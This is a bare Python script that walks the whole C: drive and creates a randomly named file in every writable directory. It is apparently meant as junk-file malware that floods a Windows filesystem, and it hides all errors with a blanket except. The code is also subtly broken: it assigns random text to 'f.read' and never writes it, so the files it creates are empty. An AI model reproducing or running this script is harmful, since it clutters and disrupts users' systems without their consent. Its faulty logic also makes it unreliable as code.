import random
import os

def makeName():
    name = ""
    for i in range(random.randrange(3,9)):
        a = random.randrange(1,4)
        if a == 1:
            name += chr(random.randrange(48,58))
        elif a == 2:
            name += chr(random.randrange(97,123))
        else:
            name += chr(random.randrange(65,91))
    return name

def makeText():
    text = ""
    for i in range(random.randrange(100,200)):
        a = random.randrange(1,4)
        if a == 1:
            text += chr(random.randrange(48,58))
        elif a == 2:
            text += chr(random.randrange(97,123))
        else:
            text += chr(random.randrange(65,91))
    return text

for (path, dir,file) in os.walk('C:/',topdown=False):
    try:
        if path == 'C:/':
            filename = path + makeName()+"."+makeName()
        else:
            filename = path + "/"+ makeName()+"."+makeName()
        f = open(filename,'w')
        f.read = makeText()
        f.close()
    except:
        pass
